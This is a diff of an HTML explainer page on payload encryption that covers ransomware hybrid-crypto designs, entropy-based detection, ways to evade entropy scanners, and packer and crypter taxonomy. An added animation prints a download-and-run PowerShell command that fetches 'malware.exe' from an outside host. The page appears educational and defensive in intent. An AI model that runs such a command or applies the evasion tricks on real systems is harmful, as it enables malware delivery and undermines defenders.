@@ -13,229 +13,638 @@
       <h1 class="text-xl font-bold text-blue-400">Payload Encryption</h1>
       <small id="reading-time" class="text-xs text-gray-400"></small>
     </div>
-    <a href="../index.html" class="text-gray-300 text-sm hover:underline">← Back to Dashboard</a>
+    <a href="../index.html" class="text-gray-300  hover:underline">← Back to Dashboard</a>
   </header>
 
   <!-- Article -->
-  <main id="article" class="p-6 space-y-6">
+<main id="article" class="p-6 space-y-2">
     <section class="bg-[#1f2937] p-6 rounded-xl shadow-md">
-        <h2 class="text-[17px] font-bold text-blue-400">What Exactly Is “Payload Encryption”?</h2>
-        <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-            In the context of offensive tooling, payload encryption is the practice of transforming an executable, shellcode, configuration block, or 
-            command stream into unreadable ciphertext and restoring it only at, or just before, execution. Unlike classic just-enough obfuscation (e.g., XOR’ing a few bytes), 
-            genuine payload encryption enforces cryptographic secrecy: no plaintext appears on disk and, if done properly, only fleetingly in memory. The key material can be 
-            hard-coded, derived on the fly, retrieved from a C2 channel, or calculated from attributes of the victim environment.
-        </p>
-        <br>
-        <h2 class="text-[17px] font-bold text-blue-400">Why Do Adversaries Bother?</h2>
-        <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> Attackers encrypt payloads for three intertwined reasons:</p>
-            <ol class="list-[upper-alpha] list-outside pl-8 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                <li><strong>Stealth:</strong> static scanners cannot match signatures they cannot see.</li>
-                <li><strong>Flexibility:</strong> a single loader can unpack multiple mission-specific modules at runtime.</li>
-                <li><strong>Control:</strong> by withholding keys or wrapping them in environmental conditions, operators decide where and when the code detonates, frustrating incident response and sandboxing efforts. </li>
-                <li> MITRE’s Environmental Keying technique formalises this tactic in ATT&CK T1480.001. </li>
-            </ol>
-        <br>
-        <h2 class="text-[17px] font-bold text-blue-400">Pros and Cons from an Operator’s Perspective:</h2>
-        <div class="overflow-x-auto rounded-md border border-gray-700">
-            <table class="table-auto w-full border border-gray-600 border-collapse">
-                <thead class="bg-gray-800 text-white">
-                <tr>
-                    <th class="px-3 py-2 border border-gray-600 font-semibold">Pros</th>
-                    <th class="px-3 py-2 border border-gray-600 font-semibold">Cons</th>
-                </tr>
-                </thead>
-                <tbody class="bg-gray-900 text-gray-100">
-                <tr>
-                    <td class="px-3 py-2 border border-gray-600">Bypasses string- and opcode-based detection; hampers reverse engineering</td>
-                    <td class="px-3 py-2 border border-gray-600">Adds operational complexity; builds can break if key exchange fails</td>
-                </tr>
-                <tr>
-                    <td class="px-3 py-2 border border-gray-600">Facilitates reuse of commodity implants under new cryptographic wrappers (crypters / packers)</td>
-                    <td class="px-3 py-2 border border-gray-600">Increased binary size and runtime overhead</td>
-                </tr>
-                <tr>
-                    <td class="px-3 py-2 border border-gray-600">Enables fine-grained target gating&nbsp;(decrypt only on hosts in a certain domain)</td>
-                    <td class="px-3 py-2 border border-gray-600">Mishandled crypto (weak keys, predictable IVs) exposes the campaign and aids decryptor tooling</td>
-                </tr>
-                </tbody>
-            </table>
-        </div>
-        <br>
-        <h2 class="text-[17px] font-bold text-blue-400">Detection and Defensive Considerations:</h2>
-        <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-            Static YARA signatures can still flag decryptor stubs like API import patterns for <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">CryptEncrypt</code>, <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">VirtualProtect</code>, or self-modifying loops. Memory scanners hunt 
-            for freshly committed <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">RWX</code> pages whose entropy suddenly drops after write-and-execute pivots. Behavioural analytics look for the hallmark sequence: 
-            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">allocate → write high-entropy buffer → change protection → create thread</code>. Yet, environmental keying and just-in-time key delivery force defenders to instrument the process context network, registry, VM introspection rather than rely solely on byte patterns. 
-        </p>
-        <br>
-        <h2 class="text-[17px] font-bold text-blue-400">Defending Against Security-Side Brute-Force:</h2>
-        <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-            When a threat-actor ships an encrypted payload, the real battle is no longer whether defenders will capture the ciphertext—sooner or later they will—but whether
-            anyone can crack it before the campaign is finished. Seasoned operators therefore harden the key itself, add layers of misdirection, and make brute-forcing financially or computationally irrational.
-            <ol class="list-[upper-alpha] list-outside pl-8 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                <li><strong>Use a keyspace that defenders cannot afford to search:</strong> Contemporary ransomware builders default to 256-bit AES or XChaCha20 session keys wrapped in RSA-2048 or Curve25519. One successful brute-force would cost weeks of GPU time and still expose only a single victim because each implant is keyed per-host. LockBit 3.0 is explicit about that design choice: the stub generates a fresh AES-CTR key on every endpoint and discards it once encryption finishes.</li>
-            </ol>
-        </p>
-        <br>
-        <h2 class="text-[17px] font-bold text-blue-400">Symmetric vs. Asymmetric: What Operators Really Prefer?</h2>
-            <ol class="list-[upper-alpha] list-outside pl-8 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                <li><strong>Bulk encryption demands speed and stealth ⇒ symmetric wins:</strong> Encrypting gigabytes of victim data (or even a 500 KB reflective DLL) must finish before EDR’s behavioural models flag the process. AES-NI or ChaCha20 running in user space gives gigabytes-per-second throughput with only a few hundred bytes of decryption stub.</li>
-                <li><strong>Key protection demands one-way secrecy ⇒ asymmetric wins:</strong> If the same raw AES key were hard-coded in every build, any incident-responder could reverse one sample and unlock them all. Wrapping that key inside an RSA/ECC envelope means the blue team would have to crack 2048-bit RSA (computationally infeasible) or reach the attacker’s C2 to obtain the private key.</li>
-                <li><strong>In practice, attackers merge both in a hybrid design:</strong><code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">Generate random symmetric key → encrypt payload/data → encrypt that key with attacker’s public RSA/ECC key</code>. This is the workflow documented in LockBit 3.0, BlackCat, Hive, Conti, and “fake” LockBit variants discovered by <a href="https://www.trendmicro.com/en_us/research/24/j/fake-lockbit-real-damage-ransomware-samples-abuse-aws-s3-to-stea.html" class="underline">Trend Micro</a> that switched to AES-CTR + MD5-derived per-file keys.</li>
-                <li><strong>Why not purely asymmetric?</strong></li>
-                <ol class="list-disc list-outside pl-3 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                    <li><strong>Throughput:</strong> RSA/ECC is slow for large data.</li>
-                    <li><strong>Size:</strong> an RSA-encrypted 20 MB payload balloons far beyond practical loader sizes.</li>
-                    <li><strong>Detectability:</strong> public-key operations drag in big-number libraries (bcryptprimitives, mbedTLS) that raise heuristic flags and leave unmistakable API traces (BCryptEncrypt, CryptImportKey, etc.).</li>
-                </ol>
-                <li><strong>Why not purely symmetric?</strong></li>
-                <ol class="list-disc list-outside pl-3 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                    <li><strong>Key exposure:</strong> a 256-bit AES key hidden only by simple XOR or shifting can be brute-forced or extracted once the malware is captured. Without asymmetric wrapping, every sample decrypted in a sandbox burns the entire campaign.</li>
-                </ol>
-            </ol><br>
-            <h2 class="text-[17px] font-bold text-blue-400">What “entropy level” really means:</h2>
-            <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-                In forensic tooling the entropy level of a file (or of an individual PE section, packet, log record, etc.) is the average Shannon entropy measured in bits per 
-                byte. The scale runs from 0 (completely predictable, all-zero padding) to 8 (completely random—what you’d get from strong encryption or good PRNG output). IBM’s 
-                QRadar docs use exactly this 0–8 scale when explaining why encrypted ZIPs look suspicious. Mathematically the scanner walks the byte array, builds a 256-bucket histogram,
-                and plugs the counts into: <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">H = – Σ (pᵢ · log₂ pᵢ)</code> where pᵢ is the probability of each byte value 0-255. A perfectly uniform distribution gives 8.0 bits/byte; English text hovers around 4.3–5.0.
-            </p><br>
-            <h2 class="text-[17px] font-bold text-blue-400">Why malware authors watch their entropy?</h2>
-            <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-                Defenders long ago realised that “almost-8-bit entropy” flags encryption, packing or steganography. Static engines therefore raise risk scores on sections (or outbound file writes) 
-                whose entropy spikes past a threshold, commonly 7.2–7.5 bits/byte. Attackers respond in two ways:
-                <ol class="list-disc list-outside pl-6 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                    <li><strong>Camouflage:</strong> compress first then encrypt LockBit does this per-victim file, nudging the final entropy down just enough to dodge the 7-ish heuristic while still being unrecoverable without the key.</li>
-                    <li><strong>Padding or mixing:</strong> sprinkle low-entropy junk (e.g., zero pages, ASCII strings) around the ciphertext so the section-wide average drops below the alert line. Some crypters even insert fake import tables or config blocks for the same reason.</li>
-                </ol>
-            </p><br>
-            <h2 class="text-[17px] font-bold text-blue-400">How security tools evaluate entropy?</h2>
-            <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-                Static scanners (YARA, AV engines, EDR disk monitors) usually:
-                <ol class="list-disc list-outside pl-6 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                    <li>Slice: each file into chunks, whole file, per-section (PE headers, .text, .rsrc), or rolling windows of N kB.</li>
-                    <li>Compute Shannon entropy: for each slice.</li>
-                    <li>Compare to policy:</li>
-                    <ol class="list-[upper-alpha] list-outside pl-4 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                        <li>global rule “if entropy > 7.5 bits & section name ≠ .text ⇒ flag as packed”. or</li>
-                        <li>ML feature vector where entropy is one signal among many.</li>
-                    </ol>
-                </ol>
-                <div class="boxed-inline">
-                    Behavioural or anti-ransomware monitors go one step further, they hook write APIs <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtWriteFile</code> & <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">WriteFileEx</code> and measure the entropy of every outbound 
-                    buffer in real time. If a process suddenly starts saving 7.6-bit data into dozens of documents, the tool blocks the write exactly the trick demonstrated 
-                    in an open-source anti-ransomware library that denies writes above 7.5 bits/byte
+        <div class="2">
+            <section class="relative rounded-xl shadow-2xl bg-gray-900 p-10 overflow-hidden">
+                <div class="absolute -bottom-20 -right-20 w-96 h-96 bg-gradient-to-br from-green-400 to-blue-600 opacity-30 blur-3xl animate-blob animation-delay-2000"></div>
+                <div class="relative grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
+                    <section class="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl shadow-2xl overflow-visible p-6">
+                        <!-- Animated Gradient Bar -->
+                        <div class="absolute inset-x-0 top-0 h-1 bg-gradient-to-r from-green-400 via-blue-400 to-purple-400 animate-gradient-x"></div>
+                        <pre id="typedArea" class="relative z-10 bg-gray-800 bg-opacity-70 rounded-lg p-4 font-mono text-green-300 text-sm overflow-y-auto max-h-80"></pre>
+                    </section>
+                    <style>
+                        @keyframes gradient-x {
+                          0% { background-position: 0% 50%; }
+                          100% { background-position: 200% 50%; }
+                        }
+                        .animate-gradient-x {
+                          background-size: 200% 200%;
+                          animation: gradient-x 4s ease infinite;
+                        }
+                        #typedArea::after {
+                          content: '|';
+                          animation: blink 1s steps(1) infinite;
+                        }
+                        @keyframes blink {
+                          50% { opacity: 0; }
+                        }
+                        #typedArea {
+                          white-space: pre-wrap;
+                          word-break: break-word;
+                        }
+                      </style>
+                      <script>
+                        document.addEventListener('DOMContentLoaded', () => {
+                          const area = document.getElementById('typedArea');
+                          const clearText = 'Encrypt.exe -c "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri "https://ironhulk.com/malware.exe" -OutFile "$env:TEMP\\Payload.exe\\"; Start-Process -FilePath "$env:TEMP\\Payload.exe\\" -NoNewWindow"';
+                          const cipherText = '\n Encrypted payload: {0xBA, 0xDF, 0x00, 0x0D, 0x0E, 0xE8, 0xF9, 0xA5, 0xDE, 0x46, 0x48, 0x31, 0xAD, 0xBE, 0xEF, 0xCA}';
+                          let idx = 0;
+                          function typeClear() {
+                            if (idx < clearText.length) {
+                              area.textContent += clearText[idx++];
+                              setTimeout(typeClear, 75);
+                            } else {
+                              area.textContent += '\n';
+                              idx = 0;
+                              setTimeout(typeCipher, 500);
+                            }
+                          }
+                          function typeCipher() {
+                            if (idx < cipherText.length) {
+                              area.textContent += cipherText[idx++];
+                              area.scrollTop = area.scrollHeight;
+                              setTimeout(typeCipher, 25);
+                            } else {
+                              setTimeout(() => {
+                                area.textContent = '';
+                                idx = 0;
+                                typeClear();
+                              }, 5000);
+                            }
+                          }
+                          typeClear();
+                        });
+                        </script>
+                <div class="relative bg-gray-900 p-8 rounded-2xl shadow-2xl overflow-hidden">
+                    <div class="absolute -top-10 -left-10 w-48 h-48 bg-gradient-to-tr from-purple-600 to-pink-500 opacity-20 blur-3xl animate-blob"></div>
+                    <div class="absolute -bottom-10 -right-10 w-48 h-48 bg-gradient-to-br from-indigo-400 to-blue-600 opacity-20 blur-3xl animate-blob animation-delay-2000"></div>
+                    <div class="relative z-10 text-gray-100 space-y-6">
+                        <h2 class="text-3xl font-extrabold text-white flex items-center">
+                        <span class="w-1 h-8 bg-indigo-400 mr-4 rounded"></span>
+                        What Exactly Is <span class="text-indigo-400 ml-2">“Payload Encryption”?</span>
+                        </h2>
+                        <p class="text-base leading-relaxed sm:text-justify">
+                        In the context of offensive tooling, payload encryption is the practice of transforming an executable, shellcode, configuration block, or 
+                        command stream into unreadable ciphertext and restoring it only at, or just before, execution. Unlike classic just-enough obfuscation (e.g., XOR’ing a few bytes), 
+                        genuine payload encryption enforces cryptographic secrecy: no plaintext appears on disk and, if done properly, only fleetingly in memory. The key material can be 
+                        hard-coded, derived on the fly, retrieved from a C2 channel, or calculated from attributes of the victim environment.
+                    </p>
+                        <div class="h-1 bg-gradient-to-r from-indigo-400 via-transparent to-indigo-400 rounded-full w-20 animate-pulse"></div>
+                    </div>
                 </div>
-                <style>
-                    .boxed-inline
-                    {
-                        display:inline-block;
-                        border:5px solid #555;
-                        background:#334155;
-                        padding:14px 18px;
-                        margin:20px 0;
-                        border-radius:6px;
-                        line-height:1.45;
-                    }
-                </style>
-            </p>
-            <h2 class="text-[17px] font-bold text-blue-400">Typical entropy ranges in clean files</h2>
-            <div class="overflow-x-auto rounded-md border border-gray-700">  
-                <table style="width:100%; border-collapse:collapse; border:1px solid #555;">
-                    <thead class="bg-gray-800 text-white">
-                    <tr>
-                        <th style="border:1px solid #555; padding:6px;">File type</th>
-                        <th style="border:1px solid #555; padding:6px;">Common range (bits/byte)</th>
-                        <th style="border:1px solid #555; padding:6px;">Notes</th>
-                    </tr>
-                    </thead>
-                    <tbody class="bg-gray-900 text-gray-100">
-                    <tr>
-                        <td style="border:1px solid #555; padding:6px;">Plain text / scripts</td>
-                        <td style="border:1px solid #555; padding:6px;">4.0 – 6.0</td>
-                        <td style="border:1px solid #555; padding:6px;">ASCII is highly repetitive.</td>
-                    </tr>
-                    <tr>
-                        <td style="border:1px solid #555; padding:6px;">Native executables: <code>/bin/bash</code>, <code>kernel32.dll</code></td>
-                        <td style="border:1px solid #555; padding:6px;">6.0 – 7.0</td>
-                        <td style="border:1px solid #555; padding:6px;">Mix of code and structured headers.</td>
-                    </tr>
-                    <tr>
-                        <td style="border:1px solid #555; padding:6px;">Compressed archives: ZIP, PNG</td>
-                        <td style="border:1px solid #555; padding:6px;">7.5 – 7.9</td>
-                        <td style="border:1px solid #555; padding:6px;">Compression flattens byte frequency.</td>
-                    </tr>
-                    <tr>
-                        <td style="border:1px solid #555; padding:6px;">Encrypted payloads / packed ransomware</td>
-                        <td style="border:1px solid #555; padding:6px;">7.8 – 8.0</td>
-                        <td style="border:1px solid #555; padding:6px;">Near-perfect uniformity (“TV snow”).</td>
-                    </tr>
-                    </tbody>
-                </table>
-            </div><br>
-            <h2 class="text-[17px] font-bold text-blue-400">Compression-Then-Encryption: Beating the Entropy Sensor</h2>
-            <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-                Static engines often flag any section with near-perfect entropy (~7.9 bits/byte). LockBit sidesteps this by LZ-compressing each victim file before running 
-                AES-CTR. Compressed data skews entropy downward just enough to dodge the simplest “high entropy” heuristic while still unpacking correctly after decryption.
-            </p><br>
-            <h2 class="text-[17px] font-bold text-blue-400">Loader Taxonomy: Packers vs. Crypters vs. Protectors:</h2>
-            <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">Malware authors rarely hand-roll encryption from scratch. Instead, they lean on a small ecosystem of commercial or cracked builders that wrap a payload in layers of compression, encryption, and anti-analysis glue:</p>
-            <div class="overflow-x-auto rounded-md border border-gray-700">  
-                <table class="table-auto w-full border border-gray-600 border-collapse">
-                    <thead class="bg-gray-800 text-white">
-                    <tr>
-                        <th class="px-3 py-2 border border-gray-600 font-semibold">Type</th>
-                        <th class="px-3 py-2 border border-gray-600 font-semibold">What It Does</th>
-                        <th class="px-3 py-2 border border-gray-600 font-semibold">Typical Examples</th>
-                        <th class="px-3 py-2 border border-gray-600 font-semibold">Telltale Artifacts</th>
-                    </tr>
-                    </thead>            
-                    <tbody class="bg-gray-900 text-gray-100">
-                    <tr>
-                        <td class="px-3 py-2 border border-gray-600">Packer</td>
-                        <td class="px-3 py-2 border border-gray-600">Compresses (optionally encrypts) a payload and self-extracts at runtime</td>
-                        <td class="px-3 py-2 border border-gray-600">UPX, MPRESS, PECompact</td>
-                        <td class="px-3 py-2 border border-gray-600">Inflated entry-point stub, decompression loops visible in disassembly</td>
-                    </tr>            
-                    <tr>
-                        <td class="px-3 py-2 border border-gray-600">Crypter</td>
-                        <td class="px-3 py-2 border border-gray-600">Encrypts with user-supplied key and adds a runtime decryptor stub</td>
-                        <td class="px-3 py-2 border border-gray-600">ScrubCrypt, CryptOne</td>
-                        <td class="px-3 py-2 border border-gray-600">Encrypted .data section, minimal strings, single AES/RC4 decryptor</td>
-                    </tr>            
-                    <tr>
-                        <td class="px-3 py-2 border border-gray-600">Protector</td>
-                        <td class="px-3 py-2 border border-gray-600">Adds VM obfuscation, anti-debug, integrity checks on top of a crypter</td>
-                        <td class="px-3 py-2 border border-gray-600">Themida, VMProtect</td>
-                        <td class="px-3 py-2 border border-gray-600">Custom VM bytecode, mangled import tables, heavy anti-analysis tricks</td>
-                    </tr>
-                    </tbody>
-                </table>  
-            </div>
+              </div>
+                <br>
+                <section class="relative rounded-xl bg-gray-800 p-8 overflow-hidden shadow-lg">
+                    <div class="absolute -top-16 -right-16 w-64 h-64 bg-gradient-to-tr from-yellow-500 to-red-500 opacity-15 blur-2xl animate-blob"></div>
+                    <h2 class="text-3xl font-bold text-white">Why Do Adversaries <span class="text-yellow-400">Bother?</span></h2>
+                    <ul class="mt-4 grid grid-cols-1 md:grid-cols-3 gap-6 text-gray-200 ">
+                        <li class="flex items-start space-x-3 ">
+                            <div class="w-4 h-8 bg-green-400 rounded-full flex items-center sm:text-justify text-gray-900 "></div>
+                            <p><strong>Stealth:</strong> Static scanners cannot match signatures they cannot see.</p>
+                        </li>
+                        <li class="flex items-start space-x-3">
+                            <div class="w-4 h-8 bg-blue-400 rounded-full flex items-center sm:text-justify text-gray-900"></div>
+                            <p><strong>Flexibility:</strong> A single loader can unpack multiple mission-specific modules at runtime.</p>
+                        </li>
+                        <li class="flex items-start space-x-3">
+                            <div class="w-4 h-8 bg-red-400 rounded-full flex items-center sm:text-justify text-gray-900"></div>
+                            <p><strong>Control:</strong> By withholding keys or wrapping them in environmental conditions, operators decide where and when the code detonates, frustrating incident response and sandboxing efforts.</p>
+                        </li>
+                        <li class="col-span-full italic text-gray-400">MITRE’s Environmental Keying technique formalises this tactic in ATT&CK T1480.001.</li>
+                    </ul>
+                </section>
+                <br>
+                <div class="relative bg-gradient-to-br from-gray-800 to-gray-900 p-8 rounded-2xl shadow-2xl overflow-hidden">
+                    <div class="absolute -top-16 -left-16 w-64 h-64 bg-gradient-to-tr from-purple-500 to-pink-500 opacity-20 blur-3xl animate-blob"></div>
+                    <h2 class="text-3xl font-extrabold text-center text-white mb-8">
+                      Pros &amp; Cons <span class="text-pink-400">For Operators</span>
+                    </h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 relative z-10">
+                      <div class="bg-gray-800 bg-opacity-60 p-6 rounded-xl transform hover:scale-105 transition-transform duration-300">
+                        <div class="flex items-center mb-4">
+                          <span class="w-8 h-8 bg-green-400 rounded-full flex items-center justify-center text-white font-bold">✓</span>
+                          <h3 class="ml-3 text-xl font-semibold text-green-300">Pros</h3>
+                        </div>
+                        <ul class=" text-gray-100 pl-4 list-disc">
+                          <li>Bypasses string- and opcode-based detection; hampers reverse engineering</li>
+                          <li>Reuses commodity implants under fresh cryptographic wrappers</li>
+                          <li>Enables target gating (decrypt only on approved hosts)</li>
+                        </ul>
+                      </div>
+                      <div class="bg-gray-800 bg-opacity-60 p-6 rounded-xl transform hover:scale-105 transition-transform duration-300 animation-delay-500">
+                        <div class="flex items-center mb-4">
+                          <span class="w-8 h-8 bg-red-400 rounded-full flex items-center justify-center text-white font-bold">✕</span>
+                          <h3 class="ml-3 text-xl font-semibold text-red-300">Cons</h3>
+                        </div>
+                        <ul class="text-gray-100 pl-4 list-disc">
+                          <li>Increases complexity; key-exchange failures break builds</li>
+                          <li>Adds binary size and runtime overhead</li>
+                          <li>Weak crypto choices expose campaigns to easy tools</li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                <br>
+                <div class="w-full bg-gray-800 bg-opacity-50 rounded-lg p-6 animate-fadeInUp animation-delay-500">
+                    <h2 class="text-2xl font-bold text-red-400 mb-1 flex items-center mb-4">
+                        <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3"></path></svg>
+                        Detection and Defensive Considerations</span>
+                    </h2>
+                    <p class="text-gray-300 leading-relaxed text-justify pl-1 ">
+                        Static <span class="text-blue-300 font-mono ">YARA</span> signatures can still flag decryptor stubs like API import patterns for <code class="bg-gray-800 text-green-300 rounded px-1">CryptEncrypt</code>, <code class="bg-gray-800 text-green-300 rounded px-1">VirtualProtect</code>, or self-modifying loops. Memory scanners hunt 
+                        for freshly committed <code class="bg-gray-800 text-green-300 rounded px-1">RWX</code> pages whose entropy suddenly drops after write-and-execute pivots. Behavioural analytics look for the hallmark sequence: 
+                        <code class="bg-gray-800 text-green-300 rounded px-1">allocate → write high-entropy buffer → change protection → create thread</code>. Yet, environmental keying and just-in-time key delivery force defenders to instrument the process context network, registry, VM introspection rather than rely solely on byte patterns.                     </p>
+                </div>
+                <br>
+                <div class="w-full bg-gray-800 bg-opacity-50 rounded-lg p-6 animate-fadeInUp animation-delay-500">
+                    <h2 class="text-2xl font-bold text-blue-400 mb-1 flex items-center mb-4">
+                        <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3"></path></svg>
+                        Defending Against Security-Side Brute-Force:</span>
+                    </h2>
+                    <p class="text-gray-300 leading-relaxed text-justify pl-1">
+                        When a threat-actor ships an encrypted payload, the real battle is no longer whether defenders will capture the ciphertext, sooner or later they will, but whether
+                        anyone can crack it before the campaign is finished. Seasoned operators therefore harden the key itself, add layers of misdirection, and make brute-forcing financially or computationally irrational.
+                        <br><br>
+                        <div class="flex items-start space-x-4">
+                            <div class="w-4 h-12 bg-indigo-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
+                            <div>
+                              <p class="text-gray-300 sm:text-justify"><strong>Use a keyspace that defenders cannot afford to search:</strong> Contemporary ransomware builders default to 256-bit AES or XChaCha20 session keys wrapped in RSA-2048 or Curve25519. One successful brute-force would cost weeks of GPU time and still expose only a single victim because each implant is keyed per-host. LockBit 3.0 is explicit about that design choice: the stub generates a fresh AES-CTR key on every endpoint and discards it once encryption finishes.</p>
+                            </div>
+                          </div>
+                    </p>
+                </div>
+                <br>
+                <section class="relative rounded-xl bg-gray-800 p-8 overflow-visible shadow-lg">
+                    <div class="absolute -bottom-16 -right-16 w-72 h-72 bg-gradient-to-br from-blue-400 to-green-400 opacity-20 blur-2xl animate-blob animation-delay-2000"></div>
+                    <h2 class="text-2xl font-bold text-white-400 mb-6">Symmetric vs. Asymmetric<br><span class="text-indigo-400 text-lg">What Operators Really Prefer?</span></h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                      <!-- Item 1 -->
+                      <div class="flex items-start space-x-4">
+                        <div class="w-5 h-10 bg-indigo-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
+                        <div>
+                          <h3 class="font-semibold text-white">Bulk encryption demands speed &amp; stealth:</h3>
+                          <p class="text-gray-300 sm:text-justify">Encrypting gigabytes of victim data (or even a 500 KB reflective DLL) must finish before EDR’s behavioural models flag the process. AES-NI or ChaCha20 running in user space gives gigabytes-per-second throughput with only a few hundred bytes of decryption stub.</p>
+                        </div>
+                      </div>
+                      <!-- Item 2 -->
+                      <div class="flex items-start space-x-4">
+                        <div class="w-5 h-10 bg-blue-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
+                        <div>
+                          <h3 class="font-semibold text-white">Key protection demands one-way secrecy:</h3>
+                          <p class="text-gray-300 sm:text-justify">If the same raw AES key were hard-coded in every build, any incident-responder could reverse one sample and unlock them all. Wrapping that key inside an RSA/ECC envelope means the blue team would have to crack 2048-bit RSA (computationally infeasible) or reach the attacker’s C2 to obtain the private key.</p>
+                        </div>
+                      </div>
+                      <!-- Item 3 -->
+                      <div class="flex items-start space-x-4">
+                        <div class="w-5 h-10 bg-green-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
+                        <div>
+                          <h3 class="font-semibold text-white">Hybrid approach</h3>
+                          <p class="text-gray-300 sm:text-justify"><code class="bg-gray-800 text-green-300 rounded px-1">Generate random symmetric key → encrypt payload/data → encrypt that key with attacker’s public RSA/ECC key</code>. This is the workflow documented in LockBit 3.0, BlackCat, Hive, Conti, and “fake” LockBit variants discovered by <a href="https://www.trendmicro.com/en_us/research/24/j/fake-lockbit-real-damage-ransomware-samples-abuse-aws-s3-to-stea.html" class="underline">Trend Micro</a> that switched to AES-CTR + MD5-derived per-file keys.</p>
+                        </div>
+                      </div>
+                    </div>
+                    <br>
+                    <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-green-400 to-blue-500 opacity-20 blur-2xl animate-blob animation-delay-2000"></div>
+                    <div class="relative z-10 grid grid-cols-1 md:grid-cols-2 gap-8 text-gray-200">
+                      <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300">
+                        <h4 class="text-lg font-semibold text-yellow-400 ">Why Not Purely Asymmetric?</h4>
+                        <ul class="list-disc p-5 list-outside text-gray-300 sm:text-justify">
+                          <li><strong>Throughput:</strong> Too slow for large payloads.</li>
+                          <li><strong>Size:</strong> 20 MB beyond practical loader sizes.</li>
+                          <li><strong>Detectability:</strong> Big-number libraries (bcryptprimitives, mbedTLS) that raise heuristic flags and leave unmistakable API traces (BCryptEncrypt, CryptImportKey, etc.)..</li>
+                        </ul>
+                      </div>
+                      <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300 animation-delay-500">
+                        <h4 class="text-lg font-semibold text-yellow-400 ">Why Not Purely Symmetric?</h4>
+                        <ul class="list-disc p-5 list-outside text-gray-300 sm:text-justify">
+                          <li><strong>Key Exposure:</strong> Raw AES keys can be extracted or brute-forced once captured.</li>
+                        </ul>
+                      </div>
+                    </div>
+                    <br>
+                    <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-green-400 to-blue-500 opacity-20 blur-2xl animate-blob animation-delay-2000"></div>
+                    <div class="relative z-10 grid grid-cols-1 md:grid-cols-2 gap-8 text-gray-200">
+                      <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300">
+                        <h3 class="text-xl font-bold text-indigo-400 mb-3">What “Entropy Level” Really Means</h3>
+                        <p class=" leading-relaxed sm:text-justify">
+                            In forensic tooling the entropy level of a file (or of an individual PE section, packet, log record, etc.) is the average Shannon entropy measured in bits per 
+                            byte. The scale runs from 0 (completely predictable, all-zero padding) to 8 (completely random—what you’d get from strong encryption or good PRNG output). IBM’s 
+                            QRadar docs use exactly this 0–8 scale when explaining why encrypted ZIPs look suspicious. Mathematically the scanner walks the byte array, builds a 256-bucket histogram,
+                            and plugs the counts into: <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">H = – Σ (pᵢ · log₂ pᵢ)</code> where pᵢ is the probability of 
+                            each byte value 0-255. A perfectly uniform distribution gives 8.0 bits/byte; English text hovers around 4.3–5.0.
+                        </p>
+                      </div>
+                      <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300 animation-delay-500">
+                        <h3 class="text-xl font-bold text-yellow-400 mb-3">Why Authors Tune Entropy</h3>
+                        <p class=" leading-relaxed sm:text-justify">
+                            Defenders long ago realised that “almost-8-bit entropy” flags encryption, packing or steganography. Static engines therefore raise risk scores on sections (or outbound file writes) 
+                            whose entropy spikes past a threshold, commonly 7.2–7.5 bits/byte. Attackers respond in two ways:
+                        </p>
+                        <ul class="list-disc list-inside sm:text-justify">
+                          <li><strong>Camouflage:</strong> Compress-then-encrypt to drop entropy below ~7.5.</li>
+                          <li><strong>Padding:</strong> Mix in zero pages or ASCII strings to lower the average.</li>
+                          <li><strong>Fakes:</strong> Insert dummy import tables/config blocks to mislead scanners.</li>
+                        </ul>
+                      </div>
